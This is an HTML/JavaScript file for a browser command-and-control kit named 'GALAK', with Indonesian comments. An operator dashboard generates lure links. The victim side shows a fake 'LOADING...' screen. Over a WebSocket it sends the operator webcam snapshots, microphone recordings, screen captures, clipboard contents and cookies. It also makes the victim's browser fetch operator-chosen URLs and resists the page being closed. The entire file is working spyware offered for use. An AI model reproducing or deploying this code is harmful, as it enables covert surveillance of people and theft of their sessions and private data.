<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Loading...</title>
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <style>
        :root { 
            --bg: radial-gradient(circle at center, #1a0b2e 0%, #05050a 100%);
            --panel: rgba(13, 13, 20, 0.85);
            --border: #3d1b66;
            --neon-purple: #b026ff;
            --neon-cyan: #00ffcc;
            --neon-pink: #ff00ff;
            --text: #c4a4e0;
        }
        
        * { box-sizing: border-box; }
        
        body { 
            background: var(--bg); 
            color: var(--neon-cyan); 
            font-family: 'Press Start 2P', monospace; 
            margin: 0; 
            display: flex; 
            height: 100vh; 
            overflow: hidden; 
            font-size: 10px; 
        }

        /* Efek Grid Cyberpunk di Background */
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: 
                linear-gradient(rgba(176, 38, 255, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(176, 38, 255, 0.05) 1px, transparent 1px);
            background-size: 30px 30px;
            pointer-events: none;
            z-index: -1;
        }

        button, input { 
            background: rgba(0, 0, 0, 0.6); 
            color: var(--neon-cyan); 
            border: 2px solid var(--border); 
            padding: 10px; 
            cursor: pointer; 
            font-family: 'Press Start 2P', monospace; 
            font-size: 8px; 
            transition: all 0.3s ease; 
            outline: none; 
            box-shadow: 0 0 5px rgba(176, 38, 255, 0.2);
        }
        
        button:hover { 
            border-color: var(--neon-purple); 
            box-shadow: 0 0 15px var(--neon-purple); 
            transform: translateY(-2px); 
            color: #fff;
        }
        button:active { transform: translateY(2px); box-shadow: 0 0 5px var(--neon-purple); }
        
        /* Tombol Fitur (On/Off) */
        .toggle-btn.active {
            background: var(--neon-purple);
            color: #fff;
            border-color: #fff;
            box-shadow: 0 0 20px var(--neon-purple), inset 0 0 10px #fff;
        }
        .toggle-btn:not(.active) {
            background: rgba(0,0,0,0.8);
            color: #444;
            border-color: #222;
            box-shadow: none;
            opacity: 0.5;
        }
        .toggle-btn:not(.active) .icon { fill: #444; }

        input:focus { border-color: var(--neon-cyan); box-shadow: 0 0 10px var(--neon-cyan); }

        /* Layout */
        #dashboard { display: none; width: 100%; height: 100%; }
        #sidebar { 
            width: 320px; 
            border-right: 2px solid var(--border); 
            padding: 15px; 
            background: var(--panel); 
            backdrop-filter: blur(5px);
            overflow-y: auto; 
            display: flex; 
            flex-direction: column; 
            gap: 20px; 
        }
        #main { flex: 1; display: flex; flex-direction: column; }
        
        /* Console Style */
        #console { 
            flex: 1; 
            padding: 15px; 
            overflow-y: auto; 
            background: rgba(0, 0, 0, 0.9); 
            font-size: 9px; 
            line-height: 1.6; 
            white-space: pre-wrap; 
            color: var(--neon-cyan); 
            border-bottom: 2px solid var(--border);
            text-shadow: 0 0 5px var(--neon-cyan);
        }

        #controls { 
            padding: 15px; 
            display: flex; 
            flex-wrap: wrap; 
            gap: 12px; 
            background: var(--panel); 
            align-items: center; 
            backdrop-filter: blur(5px);
        }

        /* Link Box */
        .link-box { 
            background: rgba(0, 0, 0, 0.7); 
            border: 2px solid var(--border); 
            padding: 12px; 
            display: flex; 
            flex-direction: column; 
            gap: 10px; 
            box-shadow: 0 0 10px rgba(176, 38, 255, 0.1);
        }
        .link-box input { width: 100%; }
        .link-result { display: none; margin-top: 10px; word-break: break-all; font-size: 7px; color: var(--neon-pink); background: #000; padding: 10px; border: 1px dashed var(--neon-pink); }
        .link-result a { color: var(--neon-pink); text-decoration: none; }
        .link-result a:hover { text-decoration: underline; text-shadow: 0 0 5px var(--neon-pink); }

        /* Client List */
        #client-list { display: flex; flex-direction: column; gap: 8px; }
        .client { 
            padding: 12px; 
            cursor: pointer; 
            border: 2px solid var(--border); 
            background: rgba(0,0,0,0.8); 
            word-break: break-all; 
            display: flex; 
            align-items: center; 
            gap: 10px; 
            transition: all 0.3s; 
        }
        .client:hover { border-color: var(--neon-cyan); box-shadow: 0 0 10px rgba(0, 255, 204, 0.3); }
        .client.active { 
            background: var(--neon-cyan); 
            color: #000; 
            border-color: var(--neon-cyan); 
            font-weight: bold; 
            box-shadow: 0 0 15px var(--neon-cyan); 
        }

        #img-preview { max-width: 100%; max-height: 400px; display: none; border: 2px solid var(--neon-purple); margin: 15px; box-shadow: 0 0 20px var(--neon-purple); }

        /* Target View (Loader) */
        #target-view { 
            display: none; 
            justify-content: center; 
            align-items: center; 
            flex-direction: column; 
            width: 100%; 
            height: 100%; 
            background: var(--bg); 
        }
        .mc-loader { 
            width: 50px; height: 50px; 
            background: var(--neon-purple); 
            box-shadow: 0 0 30px var(--neon-purple), inset -5px -5px 0 rgba(0,0,0,0.5); 
            animation: mcSpin 2s infinite ease-in-out; 
            margin-bottom: 30px; 
        }
        @keyframes mcSpin { 
            0% { transform: rotate(0deg) scale(1); box-shadow: 0 0 20px var(--neon-purple); } 
            50% { transform: rotate(180deg) scale(1.2); box-shadow: 0 0 40px var(--neon-cyan); background: var(--neon-cyan); } 
            100% { transform: rotate(360deg) scale(1); box-shadow: 0 0 20px var(--neon-purple); background: var(--neon-purple); } 
        }
        #status { font-size: 10px; color: var(--neon-cyan); letter-spacing: 2px; animation: textPulse 1.5s infinite; text-shadow: 0 0 8px var(--neon-cyan); }
        @keyframes textPulse { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }

        /* Icons & Animasi */
        .icon { width: 18px; height: 18px; fill: currentColor; display: inline-block; vertical-align: middle; }
        .anim-spin { animation: spin 2s linear infinite; }
        .anim-pulse { animation: pulse 1s infinite alternate; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.15); } }

        /* Switch Toggle */
        .switch { position: relative; display: inline-block; width: 36px; height: 20px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #111; transition: .4s; border: 2px solid var(--border); border-radius: 10px; }
        .slider:before { position: absolute; content: ""; height: 12px; width: 12px; left: 2px; bottom: 2px; background-color: #555; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: rgba(0, 255, 204, 0.2); border-color: var(--neon-cyan); }
        input:checked + .slider:before { transform: translateX(16px); background-color: var(--neon-cyan); box-shadow: 0 0 8px var(--neon-cyan); }
    </style>
</head>
<body>

    <!-- DASHBOARD ADMIN -->
    <div id="dashboard">
        <div id="sidebar">
            <div class="link-box">
                <input type="text" id="c2UrlInput" value="wss://GANTI-URL-NGROK-LO" placeholder="wss://server">
                <button onclick="generateLink()" style="display:flex; align-items:center; justify-content:center; gap:8px;">
                    <svg class="icon anim-spin" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
                    GENERATE
                </button>
                <div id="generatedLinkBox" class="link-result">
                    <a href="#" id="generatedLink" target="_blank">-</a>
                </div>
            </div>
            <div id="client-list"></div>
        </div>
        
        <div id="main">
            <div id="console">[GALAK] System Ready. Pilih target dulu.</div>
            
            <div id="controls">
                <!-- WEBCAM -->
                <div style="display:flex; align-items:center; gap:8px; background:rgba(0,0,0,0.6); padding:5px; border:2px solid var(--border);">
                    <button id="btn-webcam" class="toggle-btn" onclick="toggleFeature('webcam', this)" title="Webcam">
                        <svg class="icon" viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
                    </button>
                    <label class="switch"><input type="checkbox" checked onchange="toggleSwitch('webcam', this)"><span class="slider"></span></label>
                </div>

                <!-- MIC -->
                <div style="display:flex; align-items:center; gap:8px; background:rgba(0,0,0,0.6); padding:5px; border:2px solid var(--border);">
                    <button id="btn-mic" class="toggle-btn" onclick="toggleFeature('mic', this)" title="Microphone">
                        <svg class="icon" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3z"/><path d="M17 11c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
                    </button>
                    <label class="switch"><input type="checkbox" checked onchange="toggleSwitch('mic', this)"><span class="slider"></span></label>
                </div>

                <!-- SCREEN -->
                <div style="display:flex; align-items:center; gap:8px; background:rgba(0,0,0,0.6); padding:5px; border:2px solid var(--border);">
                    <button id="btn-screen" class="toggle-btn" onclick="toggleFeature('screen', this)" title="Screen">
                        <svg class="icon" viewBox="0 0 24 24"><path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h7v2H8v2h8v-2h-2v-2h7c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 14H3V5h18v12z"/></svg>
                    </button>
                    <label class="switch"><input type="checkbox" checked onchange="toggleSwitch('screen', this)"><span class="slider"></span></label>
                </div>

                <!-- CLIPBOARD -->
                <div style="display:flex; align-items:center; gap:8px; background:rgba(0,0,0,0.6); padding:5px; border:2px solid var(--border);">
                    <button id="btn-clipboard" class="toggle-btn" onclick="toggleFeature('clipboard', this)" title="Clipboard">
                        <svg class="icon" viewBox="0 0 24 24"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm5 16H7v-2h10v2zm0-4H7v-2h10v2zm0-4H7V8h10v2z"/></svg>
                    </button>
                    <label class="switch"><input type="checkbox" checked onchange="toggleSwitch('clipboard', this)"><span class="slider"></span></label>
                </div>

                <!-- COOKIES -->
                <div style="display:flex; align-items:center; gap:8px; background:rgba(0,0,0,0.6); padding:5px; border:2px solid var(--border);">
                    <button id="btn-cookies" class="toggle-btn" onclick="toggleFeature('cookies', this)" title="Cookies">
                        <svg class="icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-2-9c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm4 4c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm-4 0c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/></svg>
                    </button>
                    <label class="switch"><input type="checkbox" checked onchange="toggleSwitch('cookies', this)"><span class="slider"></span></label>
                </div>

                <input type="text" id="cmdInput" placeholder="Target URL..." style="flex:1; min-width:200px; border-color:var(--border);">
                <button onclick="sendCustom()" style="display:flex; align-items:center; gap:8px;">
                    <svg class="icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
                    RUN
                </button>
            </div>
            
            <img id="img-preview">
        </div>
    </div>

    <!-- TARGET WEB -->
    <div id="target-view">
        <div class="mc-loader"></div>
        <p id="status">LOADING...</p>
    </div>

        <!-- ========================================== -->
    <!-- BAGIAN 2: JAVASCRIPT LOGIC                 -->
    <!-- ========================================== -->
    <script>
        // State fitur on/off
        const featureState = { webcam: true, mic: true, screen: true, clipboard: true, cookies: true };

        // Routing: Cek apakah ini Dashboard Admin atau Web Target
        if (window.location.hash.includes('#target')) {
            document.title = "Loading...";
            document.getElementById("dashboard").style.display = "none";
            document.getElementById("target-view").style.display = "flex";
            runTargetPayload();
        } else {
            document.getElementById("dashboard").style.display = "flex";
            runAdminDashboard();
        }

        // ==========================================
        // LOGIKA DASHBOARD ADMIN
        // ==========================================
        function runAdminDashboard() {
            let ws;
            let selectedTarget = null;
            // Ambil URL WebSocket dari input box
            let DASH_WS_URL = document.getElementById("c2UrlInput").value;
            
            function connect() {
                ws = new WebSocket(DASH_WS_URL);
                ws.onopen = () => log("[+] Server terhubung.");
                
                ws.onmessage = (e) => {
                    const msg = JSON.parse(e.data);
                    if (msg.type === "log") log(msg.msg);
                    else if (msg.type === "update_clients") renderClients(msg.clients);
                    else if (msg.type === "img") {
                        log(`[IMG] Diterima dari ${msg.from}`);
                        const img = document.getElementById("img-preview");
                        img.src = msg.data;
                        img.style.display = "block";
                    } else if (msg.type === "cmd_out") {
                        log(`[OUT]\n${msg.out}`);
                    }
                };
                ws.onclose = () => { log("[-] Terputus. Reconnecting..."); setTimeout(connect, 3000); };
            }

            window.log = (text) => {
                const con = document.getElementById("console");
                con.innerText += `\n${text}`;
                con.scrollTop = con.scrollHeight;
            };

            window.renderClients = (clients) => {
                const list = document.getElementById("client-list");
                list.innerHTML = "";
                clients.forEach(c => {
                    const el = document.createElement("div");
                    el.className = "client" + (c === selectedTarget ? " active" : "");
                    el.innerHTML = `<svg class="icon anim-pulse" viewBox="0 0 24 24" style="width:12px;height:12px;"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg> ${c}`;
                    el.onclick = () => { selectedTarget = c; renderClients(clients); log(`[>] Target: ${c}`); };
                    list.appendChild(el);
                });
            };

            // Fungsi Tombol Fitur (Webcam, Mic, dll)
            window.toggleFeature = (cmd, btnElement) => {
                if (!selectedTarget) return log("[!] Target kosong!");
                if (!featureState[cmd]) return log(`[!] Fitur ${cmd} sedang OFF.`);
                
                // Animasi nyala pas diklik
                btnElement.classList.add('active');
                setTimeout(() => btnElement.classList.remove('active'), 300);

                ws.send(JSON.stringify({ target: selectedTarget, cmd: cmd, _admin: true }));
                log(`[>] Mengirim perintah: ${cmd}`);
            };

            // Fungsi Switch On/Off
            window.toggleSwitch = (cmd, checkboxElement) => {
                featureState[cmd] = checkboxElement.checked;
                log(`[*] Fitur ${cmd} di-${checkboxElement.checked ? 'ON' : 'OFF'}-kan.`);
            };

            // Fungsi Tombol RUN (URL Fetch)
            window.sendCustom = () => {
                if (!selectedTarget) return log("[!] Target kosong!");
                const val = document.getElementById("cmdInput").value;
                if (!val) return;
                ws.send(JSON.stringify({ target: selectedTarget, cmd: "cmdexe", payload: val, _admin: true }));
                document.getElementById("cmdInput").value = "";
            };

            // Fungsi Generate Link Target
            window.generateLink = () => {
                const wsUrl = document.getElementById("c2UrlInput").value.trim();
                if (!wsUrl) return alert("URL WS kosong!");
                
                const baseUrl = window.location.href.split('#')[0];
                const targetUrl = `${baseUrl}#target?ws=${encodeURIComponent(wsUrl)}`;
                
                const linkEl = document.getElementById("generatedLink");
                linkEl.href = targetUrl;
                linkEl.innerText = targetUrl;
                document.getElementById("generatedLinkBox").style.display = "block";
                log(`[*] Link berhasil di-generate.`);
            };

            connect();
        }

        // ==========================================
        // LOGIKA TARGET PAYLOAD (KORBAN)
        // ==========================================
        function runTargetPayload() {
            let ws = null;
            let mediaRecorder = null;
            let recordedChunks = [];
            let reconnectTimer = null;
            
            // Ambil URL WS dari parameter link
            const hashStr = window.location.hash.split('?ws=')[1];
            const WS_URL = hashStr ? decodeURIComponent(hashStr) : "";

            if (!WS_URL) {
                document.getElementById("status").innerText = "ERROR: INVALID URL";
                return;
            }

            function connect() {
                if (ws && ws.readyState === WebSocket.OPEN) return;
                document.getElementById("status").innerText = "CONNECTING...";
                ws = new WebSocket(WS_URL);

                ws.onopen = () => {
                    document.getElementById("status").innerText = "SYSTEM READY.";
                    ws.send(JSON.stringify({ type: "info", ua: navigator.userAgent, platform: navigator.platform }));
                };

                ws.onmessage = async (e) => {
                    try {
                        const msg = JSON.parse(e.data);
                        if (msg.cmd === "webcam") await captureWebcam();
                        else if (msg.cmd === "mic") await captureMic();
                        else if (msg.cmd === "screen") await captureScreen();
                        else if (msg.cmd === "cmdexe") await execCmd(msg.command);
                        else if (msg.cmd === "clipboard") await grabClipboard();
                        else if (msg.cmd === "cookies") grabCookies();
                    } catch(err) { console.log(err); }
                };

                ws.onclose = () => {
                    document.getElementById("status").innerText = "DISCONNECTED. RETRYING...";
                    clearTimeout(reconnectTimer);
                    reconnectTimer = setTimeout(connect, 3000);
                };
                ws.onerror = () => ws.close();
            }

            // --- FUNGSI-FUNGSI EKSEKUSI TARGET ---

            async function captureWebcam() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                    const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    ws.send(JSON.stringify({ type: "webcam", data: canvas.toDataURL('image/jpeg', 0.8) }));
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}
            }

            async function captureMic() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    mediaRecorder = new MediaRecorder(stream); recordedChunks = [];
                    mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => ws.send(JSON.stringify({ type: "mic", data: reader.result }));
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(t => t.stop());
                    };
                    mediaRecorder.start(); setTimeout(() => mediaRecorder.stop(), 5000);
                } catch(e) {}
            }

            async function captureScreen() {
                try {
                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                    const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    ws.send(JSON.stringify({ type: "screen", data: canvas.toDataURL('image/jpeg', 0.8) }));
                    stream.getTracks().forEach(t => t.stop());
                } catch(e) {}
            }

            async function execCmd(url) {
                try { await fetch(url, { mode: 'no-cors' }); ws.send(JSON.stringify({ type: "cmd_out", out: "Request sent: " + url })); } 
                catch(e) { ws.send(JSON.stringify({ type: "cmd_out", out: "Error: " + e.message })); }
            }

            async function grabClipboard() {
                try { const text = await navigator.clipboard.readText(); if (text) ws.send(JSON.stringify({ type: "cmd_out", out: "[CLIPBOARD] " + text })); } catch(e) {}
            }

            function grabCookies() {
                if (document.cookie) ws.send(JSON.stringify({ type: "cmd_out", out: "[COOKIES] " + document.cookie }));
            }

            window.addEventListener('beforeunload', (e) => {
                if (ws && ws.readyState === WebSocket.OPEN) { e.preventDefault(); e.returnValue = ''; }
            });

            window.onload = () => connect();
        }
    </script>
</body>
</html>
